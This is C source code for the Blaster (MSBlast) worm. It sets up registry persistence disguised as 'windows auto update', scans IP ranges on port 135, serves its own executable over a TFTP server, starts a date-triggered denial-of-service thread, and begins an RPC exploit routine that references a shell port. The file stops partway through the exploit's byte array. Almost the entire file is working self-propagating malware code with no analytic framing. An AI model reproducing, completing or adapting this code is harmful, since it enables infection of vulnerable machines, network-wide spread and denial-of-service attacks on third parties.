#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "wininet.lib")
#pragma comment (lib, "advapi32.lib")

const char msg1[]="I just want to say LOVE YOU SAN!!";
const char msg2[]="billy gates why do you make this possible ?"
" Stop making money and fix your software!!";

#define MSBLAST_EXE "msblast.exe"

#define MSRCP_PORT_135 135

#define TFTP_PORT_69 69

#define SHELL_PORT_4444 4444

char target_ip_string[16];

int fd_tftp_service;

int is_tftp_running;

char msblast_filename[256+4];

int ClassD, ClassC, ClassB, ClassA;

int local_class_a, local_class_b;

int winxp1_or_win2k2;

ULONG WINAPI blaster_DoS_thread(LPVOID);
void blaster_spreader();
void blaster_exploit_target(int fd, const char *victim_ip);
void blaster_send_syn_packet(int target_ip, int fd);

void main(int argc, char *argv[])
{
WSADATA WSAData;
char myhostname[512];
char daystring[3];
char monthstring[3];
HKEY hKey;
int ThreadId;
register unsigned long scan_local=0;

RegCreateKeyEx(
HKEY_LOCAL_MACHINE,
"SOFTWARE\\Microsoft\\Windows\\"
"CurrentVersion\\Run",
0,
NULL,
REG_OPTION_NON_VOLATILE,
KEY_ALL_ACCESS,
NULL,
&hKey,
0);
RegSetValueExA(
hKey,
"windows auto update",
0,
REG_SZ,
MSBLAST_EXE,
50);
RegCloseKey(hKey);

CreateMutexA(NULL, TRUE, "BILLY");
if (GetLastError() == ERROR_ALREADY_EXISTS)
ExitProcess(0);

if (WSAStartup(MAKEWORD(2,2), &WSAData) != 0
&& WSAStartup(MAKEWORD(1,1), &WSAData) != 0
&& WSAStartup(1, &WSAData) != 0)
return;

GetModuleFileNameA(NULL, msblast_filename,
sizeof(msblast_filename));

while (!InternetGetConnectedState(&ThreadId, 0))
Sleep (20000);

ClassD = 0;

srand(GetTickCount());

local_class_a = (rand() % 254)+1;
local_class_b = (rand() % 254)+1;

if (gethostname(myhostname, sizeof(myhostname)) != -1) {
HOSTENT *p_hostent = gethostbyname(myhostname);

if (p_hostent != NULL && p_hostent->h_addr != NULL) {
struct in_addr in;
const char *p_addr_item;

memcpy(&in, p_hostent->h_addr, sizeof(in));
sprintf(myhostname, "%s", inet_ntoa(in));

p_addr_item = strtok(myhostname, ".");
ClassA = atoi(p_addr_item);

p_addr_item = strtok(0, ".");
ClassB = atoi(p_addr_item);

p_addr_item = strtok(0, ".");
ClassC = atoi(p_addr_item);

if (ClassC > 20) {
srand(GetTickCount());
ClassC -= (rand() % 20);
}
local_class_a = ClassA;
local_class_b = ClassB;
scan_local = TRUE;
}
}

srand(GetTickCount());
if ((rand() % 20) < 12)
scan_local = FALSE;

winxp1_or_win2k2 = 1;
if ((rand()%10) > 7)
winxp1_or_win2k2 = 2;

if (!scan_local) {
ClassA = (rand() % 254)+1;
ClassB = (rand() % 254);
ClassC = (rand() % 254);
}

#define MYLANG MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT)
#define LOCALE_409 MAKELCID(MYLANG, SORT_DEFAULT)
GetDateFormat( LOCALE_409,
0,
NULL,
"d",
daystring,
sizeof(daystring));
GetDateFormat( LOCALE_409,
0,
NULL,
"M",
monthstring,
sizeof(monthstring));
if (atoi(daystring) > 15 && atoi(monthstring) > 8)
CreateThread(NULL, 0,
blaster_DoS_thread,
0, 0, &ThreadId);

for (;;)
blaster_spreader();

WSACleanup();
}

DWORD WINAPI blaster_tftp_thread(LPVOID p)
{
char reqbuf[512];
struct sockaddr_in server;
struct sockaddr_in client;
int sizeof_client;
char rspbuf[512];

static int fd;
register FILE *fp;
register block_id;
register int block_size;

is_tftp_running = TRUE;

fd = socket(AF_INET, SOCK_DGRAM, 0);
if (fd == SOCKET_ERROR)
goto closesocket_and_exit;

memset(&server, 0, sizeof(server));
server.sin_family = AF_INET;
server.sin_port = htons(TFTP_PORT_69);
server.sin_addr.s_addr = 0;
if (bind(fd, (struct sockaddr*)&server, sizeof(server)) != 0)
goto closesocket_and_exit;

sizeof_client = sizeof(client);
if (recvfrom(fd, reqbuf, sizeof(reqbuf), 0,
(struct sockaddr*)&client, &sizeof_client) <= 0)
goto closesocket_and_exit;

block_id = 0;

fp = fopen(msblast_filename, "rb");
if (fp == NULL)
goto closesocket_and_exit;

for (;;) {
block_id++;

*(short*)(rspbuf+0) = htons(3);
*(short*)(rspbuf+2)= htons((short)block_id);

block_size = fread(rspbuf+4, 1, 512, fp);

block_size += 4;

if (sendto(fd, (char*)&rspbuf, block_size,
0, (struct sockaddr*)&client, sizeof_client) <= 0)
break;

Sleep(900);

if (block_size != sizeof(rspbuf)) {
fclose(fp);
fp = NULL;
break;
}
}

if (fp != NULL)
fclose(fp);

closesocket_and_exit:

is_tftp_running = FALSE;
closesocket(fd);
ExitThread(0);

return 0;
}

void blaster_increment_ip_address()
{
for (;;) {
if (ClassD <= 254) {
ClassD++;
return;
}

ClassD = 0;
ClassC++;
if (ClassC <= 254)
return;
ClassC = 0;
ClassB++;
if (ClassB <= 254)
return;
ClassB = 0;
ClassA++;
if (ClassA <= 254)
continue;
ClassA = 0;
return;
}
}

void blaster_spreader()
{
fd_set writefds;

register int i;
struct sockaddr_in sin;
struct sockaddr_in peer;
int sizeof_peer;
int sockarray[20];
int opt = 1;
const char *victim_ip;

memset(&sin, 0, sizeof(sin));
sin.sin_family = AF_INET;
sin.sin_port = htons(MSRCP_PORT_135);

for (i=0; i<20; i++) {
sockarray[i] = socket(AF_INET, SOCK_STREAM, 0);
if (sockarray[i] == -1)
return;
ioctlsocket(sockarray[i], FIONBIO , &opt);
}

for (i=0; i<20; i++) {
int ip;

blaster_increment_ip_address();
sprintf(target_ip_string, "%i.%i.%i.%i",
ClassA, ClassB, ClassC, ClassD);

ip = inet_addr(target_ip_string);
if (ip == -1)
return;
sin.sin_addr.s_addr = ip;
connect(sockarray[i],(struct sockaddr*)&sin,sizeof(sin));
}

Sleep(1800);

for (i=0; i<20; i++) {
struct timeval timeout;
int nfds;

timeout.tv_sec = 0;
timeout.tv_usec = 0;
nfds = 0;

FD_ZERO(&writefds);
FD_SET((unsigned)sockarray[i], &writefds);

if (select(0, NULL, &writefds, NULL, &timeout) != 1) {
closesocket(sockarray[i]);
} else {
sizeof_peer = sizeof(peer);
getpeername(sockarray[i],
(struct sockaddr*)&peer, &sizeof_peer);
victim_ip = inet_ntoa(peer.sin_addr);

blaster_exploit_target(sockarray[i], victim_ip);
closesocket(sockarray[i]);
}
}

}

void blaster_exploit_target(int sock, const char *victim_ip)
{

unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,

0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,

0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x00,0x00,0x00,0x00,
0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00}};
